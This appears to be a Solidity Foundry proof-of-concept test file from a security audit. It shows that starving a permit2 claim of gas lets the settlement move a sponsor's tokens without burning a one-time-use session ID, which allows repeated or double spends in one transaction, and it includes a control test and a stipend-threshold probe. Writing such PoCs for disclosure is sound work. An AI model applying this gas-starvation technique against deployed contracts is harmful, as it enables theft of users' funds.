// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {
    OneTimeUseIdE2E_Base
} from "../../integration/policies/OneTimeUseId/OneTimeUseIdMatrixE2E.integration.t.sol";
import { MockAdapter } from "@mocks/MockAdapter.sol";
import { Types } from "@compact-utils/types/OrderTypes.sol";

contract A7Starve_PoC is OneTimeUseIdE2E_Base {
    /// @dev split prepare from claim: _createPolicyData staticcalls, so expectRevert must be
    ///      armed AFTER it (the base harness documents this trap)
    function _prep(uint128 stipend) internal returns (bytes memory) {
        Types.Order memory order = _getPermit2Order();
        order.packedGasValues = Types.packGasValues(stipend, 0);
        $intent.userEmissarySig = _createSmartSessionSignature(_createPolicyData());
        return abi.encodeCall(
            MockAdapter.mock_permit2_handleClaim,
            (MockAdapter.ClaimDataPermit2({
                    order: order, userSigs: Types.Signatures($intent.userEmissarySig, "")
                }))
        );
    }

    function _go(bytes memory cd) internal {
        _claim(block.chainid, abi.encodePacked(env.solver.addr), cd);
    }

    /// (1) one starved settlement: funds move, nothing burns
    function test_a7_starvedSettlesWithoutBurning() public {
        _enableSession(true);
        uint256 b0 = env.token1.balanceOf($intent.sponsor);
        _go(_prep(1000));
        assertLt(env.token1.balanceOf($intent.sponsor), b0, "sponsor tokens PULLED");
        assertFalse(_burned(), "id NOT burned");
    }

    /// (2) the session bound is gone entirely
    function test_a7_starvedThenExecutorAlsoSettles() public {
        _enableSession(true);
        _go(_prep(1000));
        _settleViaExecutor(0, 43);
        assertEq(env.target.param(), 43, "executor settlement ALSO landed");
    }

    /// (3) POISONED defeated: settlement 1 funded (BURNING), settlement 2 starved rides it
    function test_a7_starvedSecondSettlementRidesBurning() public {
        _enableSession(true);
        _settleViaPermit2();
        assertTrue(_burned(), "settlement 1 burned");

        $intent.nonce = $intent.nonce + 1;
        _injectConsumeIntoPreClaimOps();

        uint256 b0 = env.token1.balanceOf($intent.sponsor);
        _go(_prep(1000));
        assertLt(env.token1.balanceOf($intent.sponsor), b0, "SECOND spend, same transaction");
    }

    /// (4) CONTROL: identical pair, funded stipend -> the poison fires and it reverts
    function test_a7_control_fundedSecondSettlementReverts() public {
        _enableSession(true);
        _settleViaPermit2();

        $intent.nonce = $intent.nonce + 1;
        _injectConsumeIntoPreClaimOps();

        bytes memory cd = _prep(300_000);
        vm.expectRevert();
        _go(cd);
    }

    /// (5) how much starvation is needed
    function test_a7_stipendThreshold() public {
        _enableSession(true);
        uint128[6] memory s = [uint128(0), 1000, 20_000, 50_000, 100_000, 200_000];
        for (uint256 i; i < s.length; ++i) {
            uint256 snap = vm.snapshotState();
            _go(_prep(s[i]));
            emit log_named_uint("stipend", s[i]);
            emit log_named_string("burned", _burned() ? "yes" : "NO");
            vm.revertToState(snap);
        }
    }
}
